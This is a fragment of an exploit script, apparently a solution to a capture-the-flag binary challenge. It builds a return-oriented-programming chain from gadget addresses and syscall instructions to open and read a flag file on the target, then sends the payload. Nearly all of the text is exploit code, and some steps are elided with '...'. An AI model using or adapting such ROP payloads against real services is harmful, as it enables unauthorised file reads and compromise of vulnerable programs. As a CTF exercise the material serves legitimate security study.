...
#call open("/home/meobeo/1")
payload2 += p64(pop_rsi)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(pop_rdi)
payload2 += p64(0x404228)
payload2 += p64(syscall_ret)
#setup for call read
...
payload2 += p64(0x1)
payload2 += p64(pop_rsi)
payload2 += p64(0x404400)
payload2 += p64(0)
payload2 += p64(syscall_ret)
#setup for call read
payload2 += p64(pop_rbp)
payload2 += p64(0x4041c0)
payload2 += p64(mov_eax_0_leave_ret)
...
payload2 += p64(0)
payload2 += p64(syscall_ret)
payload2 += b"/home/silence/267bfecf4d59aa687e0682caa929624d.txt"
#payload2 += b"/home/meobeo/1/a.txt"
#267bfecf4d59aa687e0682caa929624d.txt
p.send(payload2)
sleep(2)
p.sendline(b"A")
sleep(2)
